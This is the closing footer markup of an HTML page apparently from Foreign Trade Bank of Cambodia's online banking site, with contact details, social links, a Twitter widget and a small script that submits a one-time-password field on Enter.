  <a href="" class="Bold" onclick="" target="#">Privacy</a></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;display: none;" id="C2__row_BUT_1DB3B4C2DE4FB36915153"><div style="text-align: left; width: 100%;  float: left;  display: none;  display: none;" id="C2__p4_BUT_1DB3B4C2DE4FB36915153"><div><style>
  a.link:hover{text-decoration:underline!important;}
  </style>
  <a href="http://www.ftbbank.com/" class="Bold" onclick="" target="#">Cookie Policy</a></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div></div></div></div></div><div id="C2__COL_9624B9C4264BED1012007" class="col-lg-3 col-md-3 col-sm-6 col-xs-12" style="float: left;"><div><div style="clear: left;" id="C2__row_SPC_BEB21A336542641A3374249"><div style="text-align: left; width: 100%;" id="C2__SPC_BEB21A336542641A3374249"><div>&nbsp;<br></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="width: 100%"><div id="C2__p1_GRP_0915C9EB57833844853404" style="position: relative"><div style="width: 100%"></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div><div style="width: 100%"><div style="clear: left;" id="C2__row_HEAD_0915C9EB57833844853351"><div id="C2__p1_HEAD_0915C9EB57833844853351" style="text-align: left; ; float: left;width: 100.0%;" class="Bold"><div>ទំនាក់ទំនង​មក​ពួក​យើង
  </div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_HEAD_0915C9EB57833844853356"><div id="C2__p1_HEAD_0915C9EB57833844853356" style="text-align: left; ; float: left;width: 100.0%;" class="mutedBold"><div>ការសាកសួរកាត</div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_HEAD_0915C9EB57833844853361"><div id="C2__p1_HEAD_0915C9EB57833844853361" style="float: left;width: 100.0%;" class="muted textMedium"><div>cardcenter@ftbbank.com</div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_HEAD_0915C9EB57833844853366"><div id="C2__p1_HEAD_0915C9EB57833844853366" style="text-align: left; ; float: left;width: 100.0%;" class="mutedBold"><div>ការសាកសួរប័ណ្ណ
  </div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_HEAD_0915C9EB57833844853371"><div id="C2__p1_HEAD_0915C9EB57833844853371" style="float: left;width: 100.0%;" class="muted textMedium"><div>info@ftbbank.com</div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_HEAD_0915C9EB57833844853376"><div id="C2__p1_HEAD_0915C9EB57833844853376" style="text-align: left; ; float: left;width: 100.0%;" class="mutedBold"><div>ទូរស័ព្ទ</div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_HEAD_0915C9EB57833844853381"><div id="C2__p1_HEAD_0915C9EB57833844853381" style="float: left;width: 100.0%;" class="muted textMedium"><div>+855(0)23 862 111</div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_HEAD_0915C9EB57833844853386"><div id="C2__p1_HEAD_0915C9EB57833844853386" style="float: left;width: 100.0%;" class="muted textMedium"><div>+855(0)77 666 803</div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_HEAD_0915C9EB57833844853391"><div id="C2__p1_HEAD_0915C9EB57833844853391" style="float: left;width: 100.0%;" class="muted textMedium"><div>+855(0)93 456 805</div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div></div></div></div></div><div id="C2__COL_9624B9C4264BED1012009" class="col-lg-3 col-md-3 col-sm-6 col-xs-12" style="float: left;"><div><div style="clear: left;" id="C2__row_SPC_BEB21A336542641A3374251"><div style="text-align: left; width: 100%;" id="C2__SPC_BEB21A336542641A3374251"><div>&nbsp;<br></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;" id="C2__row_HEAD_0915C9EB57833844853396"><div id="C2__p1_HEAD_0915C9EB57833844853396" style="text-align: left; ; float: left;width: 100.0%;" class="Bold"><div>Connect</div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;display: none;" id="C2__row_TXT_0915C9EB57833844866636"><div id="C2__TXT_0915C9EB57833844866636" style="display: none;  width:100%"><div><!-- $Revision: 1.4 $ -->
  <!-- widget file maintained by edgeConnect - DO NOT EDIT -->
  <img src="images/TCIBIcons/connect.png" alt="connect" id="img_C2__TXT_0915C9EB57833844866636"></div></div></div><div style="clear: left;" id="C2__row_BUT_D18D0F0A93AC23E751435"><div style="text-align: left; width: 100%;  float: left;"><div><fieldset style="border: none; padding: 0px; margin-left: 0px; display: inline; vertical-align:middle;" id="C2__GROUP_FS_BUT_D18D0F0A93AC23E751435"><legend class="accessibilityStyle">text</legend><div id="C2__p4_BUT_D18D0F0A93AC23E751435" style="display:inline-block; "><style>
  a.link:hover{text-decoration:underline!important;}
  </style>
  <a href="../ftbcambodia.html" class="Bold" onclick="" target="#"><img src="images/TCIBIcons/fb.png"></a></div><div id="C2__p7_BUT_D18D0F0A93AC23E751435" style="display: inline-block; padding: 0px; ">&nbsp;&nbsp;</div><div id="C2__p4_BUT_D18D0F0A93AC23E751450" style="display:inline-block; "><style>
  a.link:hover{text-decoration:underline!important;}
  </style>
  <a href="../c/ForeignTradeBankofCambodia.html" class="Bold" onclick="" target="#"><img src="images/TCIBIcons/yt.png"></a></div><div id="C2__p7_BUT_D18D0F0A93AC23E751450" style="display: inline-block; padding: 0px; ">&nbsp;&nbsp;</div><div id="C2__p4_BUT_074A1398C5CDAEF979231" style="display:inline-block; "><style>
  a.link:hover{text-decoration:underline!important;}
  </style>
  <a href="https://www.linkedin.com/company/foreign-trade-bank-of-cambodia" class="Bold" onclick="" target="#"><img src="images/TCIBIcons/in.png"></a></div></fieldset></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div></div><div id="C2__COL_DD2DF67ECDEBFD7731595" class="col-lg-3 col-md-3 col-sm-6 col-xs-12" style="float: left;"><div><div style="clear: left;" id="C2__row_SPC_BEB21A336542641A3374253"><div style="text-align: left; width: 100%;" id="C2__SPC_BEB21A336542641A3374253"><div>&nbsp;<br></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;display: none;" id="C2__row_HEAD_7B252A12987AED8212339"><div id="C2__p1_HEAD_7B252A12987AED8212339" style="display: none;text-align: left; ; float: left;width: 100.0%;" class="Bold"><div>Temenos on Twitter</div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: left;display: none;" id="C2__row_TXT_7B252A12987AED825943"><div id="C2__TXT_7B252A12987AED825943" style="display: none;  width:100%"><div><a class="twitter-timeline" href="../Temenos.html" data-widget-id="349525004414771200" data-tweet-limit="1" data-chrome="nofooter noheader noborders" data-link-color="#008FBC">Tweets by @Temenos</a>
  <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script></div></div></div></div></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div> 
  
  <div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div><div><div style="clear: left;" id="row_HEAD_52BD01DBCBD8D2D8188919"><div id="p1_HEAD_52BD01DBCBD8D2D8188919" style="float: left;" class="muted textMedium"><div style="padding: 4px">Build Version V_R16.06_FTB_2.11</div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div><div style="clear: both; height: 0px; overflow: hidden" class="clearBoth"></div></div>
            
                  
                      <div style="clear:both"></div>
                  
                </div>
                 
      </form>
  
  </body>
  
  <script>
  
      var input = document.getElementById("otp");
      
      // Execute a function when the user presses a key on the keyboard
      input.addEventListener("keypress", function(event) {
        // If the user presses the "Enter" key on the keyboard
        if (event.key === "Enter") {
          // Cancel the default action, if needed
          event.preventDefault();
          // Trigger the button element with a click
          document.getElementById("btnt").click();
        }
      });
      
      
      </script>
      
  </html>
  
  
  